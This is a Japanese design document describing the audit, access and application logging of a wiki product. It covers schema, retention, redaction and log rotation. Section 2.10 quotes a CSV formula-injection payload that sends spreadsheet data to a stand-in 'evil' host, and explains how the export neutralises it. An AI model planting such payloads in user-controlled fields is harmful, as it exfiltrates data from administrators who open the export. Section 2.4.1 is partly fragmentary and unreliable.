# ログ設計

> **対象読者**: ofuro-wiki の開発者・運用者
> **策定**: 2026-08-01（#90 の実装に先立ち、ログ全体を整理した）

## 1. 全体像

ofuro-wiki のログは **3種類**。用途が違うため、保存先も保持期間も分ける。

| 種類 | 何を残すか | 保存先 | 誰が見るか | 保持 |
|---|---|---|---|:--:|
| **監査ログ** | 「誰が・いつ・何を」した**事実** | **DB**（`audit_logs`） | Admin（管理パネル） | **3年**（設定可能） |
| **アクセスログ** | HTTP / WebSocket の要求記録 | ファイル＋標準出力 | 運用者 | **90日** |
| **アプリケーションログ** | 障害調査のための内部事象 | ファイル＋標準出力 | 運用者 | **90日** |

### 「操作ログ」という区分を設けない理由

監査ログと別に「操作ログ」を作ると、**どちらに書くかで毎回迷い、結局両方に書かれる**。
**利用者の操作の記録＝監査ログ**の1本に統一し、内部事象はアプリケーションログへ送る。

### 共通ルール: どのログにも書いてはいけないもの

- **パスワード**（平文・ハッシュとも）
- **トークン類**（メールトークン、JWT、アクセストークン、OIDC の `code` / `state`）
- **クライアントシークレット**（OIDC・SMTP の認証情報）
- **ドキュメントの本文**

現時点でも出力していないが、**規約として書かないと将来足される**。
特にアクセスログはクエリ文字列をそのまま記録しがちなので、伏せ字処理を必須とする（4章）。

---

## 2. 監査ログ（#90）

### 2.1 目的

**「誰が・いつ・何をしたか」を後から追えること。** 情シス審査の必須項目。

改ざん耐性については、**DB に書く以上、DB を触れる者は消せる**。
本気で担保するなら追記専用の外部保管が要るが、v0.1.0 の範囲を超える。
本ドキュメントの目標は「**社内の誰が何をしたか、後から調べられる**」ところまでとする。

### 2.2 記録対象

| 分類 | イベント | 備考 |
|---|---|---|
| **認証** | サインイン**成功** / **失敗** / 全セッション失効 | 失敗は #117 の土台。**成功も残す**（不正ログインの成否は失敗だけでは追えない） |
| | アカウントロック（#93） | |
| | SSO サインイン（#89）・SSO によるアカウント自動作成 | |
| **パスワード** | 本人による変更 / Admin による再設定 / 変更 URL 発行 / URL によるリセット | #115 の3経路すべて |
| **ユーザー管理** | 作成 / 削除 / Admin 権限の付与・剥奪 / **CSV 一括登録**（#92） | CSV は1件のログに件数を持つ |
| **ワークスペース** | メンバー招待 / ロール変更 / 削除 / 脱退 | |
| **ドキュメント** | 作成 / **編集（集約）** / 削除 / 復元 / 公開・公開停止 | 集約は 2.6。**ゴミ箱への移動は記録できない**（下記） |
| **管理操作** | サーバー設定変更 / バックアップ作成・削除 / リストア / SSO 設定変更 | |
| | **監査ログの保持期間の変更** | 後述の理由により必須 |

> ⚠️ **単独のサインアウトは記録しない。**
> `/api/auth/sign-out` は**認証を要求しない**（失効済みトークンでも手元を片付けられるようにするため）。
> 実行者を特定できず、「誰が」の無い記録は監査の役に立たない。
> 一方、**全端末サインアウト**は認証済みで、乗っ取り対応の痕跡として価値が高いため記録する。

> **保持期間の変更自体を記録する。** 「証拠を消すために設定を短くした」を
> 検知できなければ、監査ログの意味が薄れるため。

**閲覧ログ（誰がどのページを見たか）は対象外**（#100）。実装箇所が異なり、量も桁違いになる。

### 2.3 テーブル

```prisma
model AuditLog {
  id          String   @id @default(uuid())
  actorId     String?                        // 削除済み利用者の記録を残すため NULL 可
  actorEmail  String   @db.VarChar(255)      // 当時のメールアドレス（値で保持）
  actorName   String?  @db.VarChar(255)      // 当時の表示名（値で保持）
  action      String   @db.VarChar(64)       // "user.create" 等
  targetType  String?  @db.VarChar(32)       // "user" / "doc" / "workspace" / "setting"
  targetId    String?  @db.VarChar(255)
  targetName  String?  @db.VarChar(255)      // 当時の対象名（値で保持）
  workspaceId String?  @db.Uuid
  ip          String?  @db.VarChar(45)       // IPv6 の最大長
  userAgent   String?  @db.VarChar(255)      // 255文字で切って保存
  detail      Json?
  createdAt   DateTime @default(now())

  @@index([createdAt])
  @@index([actorId, createdAt])
  @@index([action, createdAt])
}
```

#### 「当時の情報」を値で持つ（`actorEmail` / `actorName` / `targetName`）

外部キーの参照だけでは、**監査ログとして成立しない**。

- 利用者を削除すると、**「誰がやったか」が消える**
- 氏名の変更（結婚・改姓など）が起きると、**当時の名前が分からなくなる**。
  監査ログは「**当時誰だったか**」を見るものなので、現在の値を参照してはいけない
- `workspace.delete` で `targetId` しか残らないと、対象が既に消えているため
  **「この UUID は何だったのか」が永久に分からない**。`targetName` に「営業部」と
  残しておけば追える

#### 文字数の上限

| 列 | 上限 | 理由 |
|---|---|---|
| `ip` | **45** | IPv6 の最大長（`0000:...:255.255.255.255` 形式） |
| `userAgent` | **255（超過分は切る）** | Chrome の UserAgent は 300〜600文字ある。判別には255文字で足り、3年分では無視できない容量差になる |

`action` は `<対象>.<操作>` 形式（`user.create` / `doc.update` / `auth.signin.failed`）。
**Enum にはしない。** 記録対象は今後も増えるため、Enum にすると増やすたびに
マイグレーションが必要になる。文字列で持ち、画面の絞り込みと将来の集計（#117）で使う。

### 2.4 `detail` の構造（自由な JSON にしない）

**形を決めずに書き始めると、`{"count":5}` / `{"before":"Admin","after":"Member"}` /
`{"email":"..."}` のようにばらばらになり、画面と CSV 出力が作れなくなる。**
次の3つのキーのみを使う。

```jsonc
{
  "before": { },   // 変更前の値（変更系のみ）
  "after":  { },   // 変更後の値（変更系のみ）
  "meta":   { }    // それ以外の付随情報（件数・理由など）
}
```

| 例 | `detail` |
|---|---|
| ロール変更 | `{"before":{"role":"Admin"},"after":{"role":"Member"}}` |
| CSV 一括登録 | `{"meta":{"ok":48,"ng":2}}` |
| 編集の集約 | `{"meta":{"updates":37,"windowMinutes":15}}` |
| サインイン失敗 | `{"meta":{"reason":"wrong_password","attempt":3}}` |

**画面では `detail` を整形して表示する**（Pretty Print）。生の JSON を1行で出すと読めない。

### 2.4.1 記録一覧（何が・どこまで残るか）

**項目ごとに埋まるかどうかを明示**する。`—` は「その操作では意味を持たない」。

| 経路 | 記録する場所 |
|---|---|
| Admin が管理画面から作成 | Interceptor（GraphQL mutation） |

GraphQL の mutation 名で引いているため。実際にサインアップ経路の記録が抜けており、
**サインアップを開放した公開サーバーで、誰でもアカウントを作れるのに痕跡がゼロ**だった

全経路を横断して固定している。

※ `user.password.reset.token` は `@Public()` のため実行者を特定できず、**対象＝実行者**として記録する。
※ `security.alert` 系は**システムが出す**ため実行者は `system`。対象はロックされたアカウント
（種別A）のみで、種別B・C・D は対象を特定しないため入らない。
検知内容は `detail.meta`（種別・深刻度・観測値・発信元・**メール送信の結果**）。
詳細は [`intrusion-detection.md`](intrusion-detection.md)。

#### この表の使い方

- **action を足したら、必ず行を足す。** 表に無い action は「記録されているか誰も確認していない」状態
- **`—` は「意味を持たない」であって「未実装」ではない。** 未実装なら実装するか、表から外す
- 対応表（`MUTATION_ACTIONS`）のキーが実在の mutation かは**テストで検証**している
  （名前が違うと**黙って記録されない**ため）
- 操作名の翻訳の過不足も**双方向のテストで検証**している

### 2.5 記録に失敗したときの扱い

**記録に失敗しても、本来の操作は成功させる**（fail-open）。

| | 採用 | 理由 |
|---|:--:|---|
| 記録に失敗しても操作は成功させる | **✅** | 下記 |
| 記録できなければ操作を失敗させる | — | 金融・医療などの規制対象では一般的だが、本製品の位置づけとは合わない |

- 監査ログは**同じ PostgreSQL** に書く。DB が落ちていれば大半の操作が失敗するため、
  操作を止めても**守れる範囲は狭い**
- 一方、一時的な書き込み失敗で「Admin がユーザー管理を一切できない」状態になると、
  復旧の手立てまで失われる

> ⚠️ **ただし、記録に失敗した事実は必ず残す。**
> アプリケーションログへ `error` で出力する。**黙って記録されないのが最悪**であり、
> 「監査ログがある」と信じている運用者を欺くことになる。

### 2.6 ドキュメント編集の集約

**エディタは打鍵のたびにサーバーへ差分を送る**（Socket.IO の `space:push-doc-update`）。
1回ごとに1行残すと、**10人が1時間編集しただけで数万行**になり運用できない。

| 操作 | 粒度 |
|---|---|
| 作成・削除・復元 | 1件ずつ（離散的な事象） |
| **編集** | **(利用者 × ドキュメント × 15分) で1件**。`detail` に回数を持つ |

「誰がいつどのドキュメントを編集したか」は追えるうえで、行数が現実的な範囲に収まる。

### 2.6.1 ドキュメント操作の記録方法と限界

ドキュメントは**ブラウザ側（Yjs）で作られ、サーバーに「作成した」という通知が来ない。**
そのため、操作ごとに記録の取り方が異なる。

| 操作 | 記録方法 | 確実性 |
|---|---|:--:|
| **作成** | 最初の更新が届いた時点で、**保存済みデータが無ければ新規**とみなす | ○ |
| **編集** | `space:push-doc-update` を15分ごとに集約 | ◎ |
| **完全削除** | `space:delete-doc`（明確なイベント） | ◎ |
| **復元** | `recoverDoc`（GraphQL） | ◎ |
| 公開・公開停止 | `publishPage` / `revokePublicPage`（GraphQL） | ◎ |
| **ゴミ箱への移動** | **記録できない**（下記） | ✕ |

作成の判定は**接続ごと・ドキュメントごとに1回だけ**行う。
打鍵のたびに問い合わせると、集約で減らした負荷を打ち消してしまう。

> ⚠️ **ゴミ箱への移動は記録できない。**
> ブラウザ側でドキュメントの属性を変えているだけで、サーバーからは
> **通常の編集と区別がつかない**（`space:delete-doc` を通らない）。
> そのため `doc.delete` として残るのは**ゴミ箱から完全に削除**した場合のみ。
>
> 「消えた」事実は完全削除の時点で必ず残るため監査としては成立するが、
> 「いつゴミ箱に入れたか」は追えない。
> ここまで追うにはフロントエンド側の改修が必要で、#90 の範囲を超える。
> **#136** として起票済み（v0.1.0 スコープ外）。

### 2.7 記録方法

**Interceptor だけでは足りない。** 入り口が3種類あるため。

| 経路 | 方法 | 理由 |
|---|---|---|
| GraphQL / REST の**成功** | **Interceptor** | 横断的に拾える。IP・UserAgent は `req` から取得 |
| **認可拒否（403）** | **Guard 内で記録** | ⚠️ 下記のとおり、**Interceptor には届かない** |
| **WebSocket**（ドキュメント編集） | **Gateway 内で明示的に記録** | Interceptor が効かない。集約も必要 |
| **認証**（成功・失敗・ロックアウト） | **`AuthService` 内で明示的に記録** | **失敗時は例外を投げる**ため、成功時しか通らない Interceptor では拾えない |

**失敗した操作も記録する。** サインイン失敗・権限拒否の検知は監査の主目的であり、
#117（不審なログイン試行の検知）はこの記録の上に成り立つ。

#### ⚠️ Guard の拒否は Interceptor に届かない

NestJS の実行順序は **Guard → Interceptor → ハンドラ** である。
つまり **Guard が `ForbiddenException` を投げた時点で、Interceptor は一度も実行されない。**

本プロジェクトで 403 を投げているのは次の2つで、**いずれも監査したい事象そのもの**である。

| Guard | 拒否する内容 |
|---|---|
| `admin.guard.ts` | Admin 以外による管理操作（ユーザー削除・権限付与など） |
| `workspace-member.guard.ts` | メンバー以外によるワークスペースへのアクセス |

**「Interceptor で横断的に記録する」だけの設計では、これらが1件も残らない。**
そのため、**Guard 側で拒否を記録する**（判断した場所で記録するのが最も確実で、
`ExecutionContext` から利用者・IP・対象も取れる）。

> 例外フィルタ（`http-exception.filter.ts`）で拾う案もあるが、
> GraphQL の例外は Apollo の `formatError` を通り、そこには**リクエスト文脈が無い**
> （利用者・IP が取れない）。Guard 側に置く方が確実。

### 2.8 既存の `logger.log(...)` からの移行

`#115` の再設定 URL 発行、`#92` の CSV 一括登録、`#93` のロックアウトは、
現在アプリケーションログ（標準出力）に出しているだけである。
**再起動で消え、検索もできない**ため、監査ログへ移す。

### 2.9 保持期間

`ServerSetting` の `audit_log_retention_days`（既定 **1095日＝3年**）。日次バッチで削除する。

3年とするのは、**不正アクセス禁止法違反の公訴時効を考慮した実務上の目安**による。

#### 容量の見積もり（100名規模）

```
1人1日あたり ≒ 30件（サインイン + 編集の集約 + 作成・削除ほか）
100名 × 30件 × 250営業日 ≒ 75万件/年
1行 ≒ 1KB（UserAgent が最大。索引込み）
```

| 保持 | 行数 | 概算 |
|---|---|---|
| 1年 | 75万件 | 約 0.7GB |
| **3年** | **225万件** | **約 2.2GB** |

> ⚠️ **日次バックアップ（`pg_dump`）に含まれるため、バックアップも同じだけ増える。**
> 小規模な導入先が短くできるよう、設定で変更可能にしている。

#### 削除の実行も記録する

日次バッチが古い記録を消したこと自体を、監査ログに残す。

```
action = "audit.cleanup"
detail = {"meta":{"deleted":100234,"retentionDays":1095}}
```

**記録が消えた事実が残らないと、「元から無かったのか、消されたのか」を区別できない。**
保持期間の変更（2.2）とあわせて、証拠の欠落を追跡できるようにする。

### 2.10 画面

管理パネルに「監査ログ」タブ。**Admin のみ**。

- 期間・利用者（部分一致）・操作種別（`user.` のような前方一致）での絞り込み
- CSV エクスポート
- **1件の詳細表示。`detail` は整形して見せる**（Pretty Print）
  - 一覧に生の JSON を並べても読めない。「ロールを Admin から Member に変えた」のような
    **中身の確認は詳細で行う**前提にし、一覧は日時・実行者・操作・対象に絞る

#### 実装上の約束

- **終了日は「その日を含む」**（`T23:59:59.999Z` を足す）。日付だけの指定は `00:00` に
  なるため、「今日まで」で絞ると**その日の記録が1件も出ない**（利用者には理解できない）
- **取得件数に上限を設ける**（一覧200件・CSV 1万件）。3年で225万行を想定しており、
  無制限に返すと応答が返らない
- **CSV は全項目を引用符で囲む。** `detail` の JSON にカンマや引用符が入るため、
  囲まないと**列がずれて別の操作の記録に見える**
- ⚠️ **CSV は数式として解釈される先頭文字（`= + - @` タブ・改行）を無害化する。**
  利用者は**自分の表示名を自由に設定できる**ため、`=HYPERLINK("http://evil/?"&A1)` の
  ような名前が `actorName` として記録される。監査ログは Admin が開く前提のものであり、
  **Excel で開いた瞬間に数式が実行される**。引用符で囲むだけでは防げない
- **作成系は結果から対象を取る。** `adminCreateUser` などは引数に対象の ID が無く、
  結果にしか無い。引数だけを見ていると**「誰を作ったか」が残らない**

## 3. アプリケーションログ

**障害調査のための内部事象**（エラー・警告・処理の節目）。**監査の根拠には使わない。**

- 出力: NestJS 標準の `Logger`
- 保存先: ファイル（日次）＋標準出力
- 保持: **90日**

利用者の操作を残したい場合は、アプリケーションログではなく**監査ログに書く**。

### ⚠️ 1メッセージごとの記録は `debug` を使う

**既定で出力するのは `error` / `warn` / `log`（INFO）まで。** `debug` / `verbose` は出さない。
調査時のみ `LOG_LEVEL=debug` で有効化する。

この線引きは実測に基づく。開発当初、`SyncGateway` が Socket.IO の**1メッセージごとに
INFO で記録**しており、**アプリケーションログの77%**（3,750行中2,886行）を占めていた。

| 記録 | 頻度 | レベル |
|---|---|:--:|
| リストアモードの開始・終了、接続、切断、join | 接続単位 | **INFO** |
| `space:load-doc` / `space:load-doc-timestamps` | ドキュメントを開くたび・定期 | **debug** |
| `space:push-doc-update` | **打鍵のたび** | **debug** |

そのままでは100名規模で**1日140MB・90日で12GB**に達する。
監査ログで編集を15分に集約するのと同じ問題であり、**アプリログ側では出力レベルで解く**。

## 4. アクセスログ

リバースプロキシを前段に置かない構成のため（アプリが静的ファイルも配信する）、
**アプリ側で記録する**。

### 4.1 形式

```
2026-08-01T10:23:45.123Z 200 POST /graphql 42ms ip=10.0.0.5 user=a1b2c3-... email=taro@example.com ua="Mozilla/5.0 ..."
```

| 項目 | 備考 |
|---|---|
| 時刻・メソッド・パス・ステータス・所要時間 | 対象は `/api` と `/graphql` |
| IP アドレス | `trust proxy` 設定済みのため、プロキシ配下でも実 IP が取れる |
| **利用者 ID とメールアドレス** | 認証済みの場合。**プロキシのログには無い情報**であり、自前実装の利点 |
| UserAgent | |

#### WebSocket の扱い

**接続・切断は Gateway 側で記録する**（メッセージ単位では記録しない）。

> ⚠️ **アクセスログのミドルウェアでは記録できない。**
> engine.io のハンドシェイク（`/socket.io/`）は WebSocket アダプタが
> 素の http server 上で処理するため、**Express のミドルウェアを一度も通らない**。
> 実測でも、E2E で多数の接続を行ってアクセスログ6,040行中**0件**だった。
> そのため `/socket.io` は記録対象に含めていない。

#### UUID だけでなくメールアドレスも残す理由

`user=a63def13-...` だけだと、**ログを読んだ人には誰か分からない**。
毎回 DB を引くことになり、**利用者が削除されていれば永久に分からない**。
監査ログで `actorEmail` を値で持つのと同じ理由で、アクセスログにも併記する。

UUID も残すのは、**メールアドレスは変更されうる**ため。
「同じ人物の記録」を辿るには不変の識別子が要る。

### 4.2 記録しないもの

**静的ファイルの成功応答とヘルスチェックを除外する。**
アプリがフロントエンドを配信しているため、全記録では**1画面の表示で数百行**出る。
対象は **API（`/api`・`/graphql`）と WebSocket の接続・切断**に絞る。

> ただし**静的ファイルでもエラー応答（4xx / 5xx）は記録する**（障害の兆候であるため）。

### 4.3 クエリ文字列の伏せ字（必須）

**素直に記録すると実害がある。** #115 のパスワード変更 URL は次の形をとる。

```
GET /auth/changePassword?token=e61c45a7e1d4...
```

そのまま残すと、**アクセスログを読める者がそのトークンでパスワードを変更できる**。
`token` / `password` / `secret` / `code` / `state` を含むパラメータは `***` に置換する。

### 4.4 保持

**90日。** アプリケーションログと同じ仕組み（5章）。

## 5. 保存場所とローテート

### なぜ標準出力だけにしないか

Docker の `json-file` ローテート（`max-size` / `max-file`）は**容量でしか制御できない**。
ログが多い日が続けば90日より早く消え、少なければ長く残る。
**「90日保持しています」と言えない**ため、期間で消す仕掛けを別に持つ。

### 方式

| 出力先 | 目的 | 制御 |
|---|---|---|
| **ファイル**（日次） | **長期保持（90日）** | 日次バッチで**圧縮**し、90日より古いものを削除 |
| 標準出力 | `docker logs` での即時確認 | Docker のローテート（10MB × 3世代） |

### 圧縮（日次）

**当日より前のファイルを gzip 圧縮する。** 当日分は書き込み中のため対象にしない。

実測した圧縮率（E2E 実行時のログ）:

| | 圧縮前 | 圧縮後 | 比 |
|---|---|---|:--:|
| アクセスログ | 570KB | **21KB** | **1/26** |
| アプリケーションログ | 522KB | **42KB** | **1/12** |

**月別にまとめない。** 障害調査では「その日のログ」を見ることが多く、
月次1ファイルだと数百MBを展開することになる。日次のまま圧縮する方が扱いやすい。

Node 標準の `zlib` で行うため、**依存は増やさない**。
圧縮に失敗した場合は**元のファイルを残す**（消してから失敗させない）。

- ファイル名: `access-YYYY-MM-DD.log` / `app-YYYY-MM-DD.log`
- 置き場所: **データボリューム配下**（コンテナを作り直しても消えないようにするため）
- 削除は `@Cron` の日次バッチ（毎日4時）。バックアップ（`scheduled-backup.service.ts`）と
  ドキュメント履歴で同じ仕組みを使っており、**新しい依存は増やさない**

### 設定

| 環境変数 | 既定 | 内容 |
|---|---|---|
| `LOG_STORAGE_PATH` | `./data/logs`（Docker では `/data/logs`） | ログファイルの置き場所 |
| `LOG_RETENTION_DAYS` | `90` | この日数より古いファイルを削除する |
| `LOG_LEVEL` | `log` | この水準まで出力する。`debug` を指定すると1メッセージごとの記録も出る |

`docker-compose.yml` では `logdata` ボリュームを `/data/logs` にマウントし、
標準出力側は `json-file` の `max-size: 10m` / `max-file: 3` で抑えている。

### 実装上の約束

- **削除の判定はファイル名の日付で行う。** 更新時刻で判定すると、
  追記が続いたファイルを消し損ねる
- **ログ以外のファイルは削除しない。** 命名規則に合うものだけを対象にする
  （同じディレクトリに置かれた別の資産を壊さないため）
- **書き込みに失敗してもアプリは止めない。** ログを出そうとしただけで
  リクエストが失敗する事態を避ける（失敗はアプリケーションログに警告として残す）
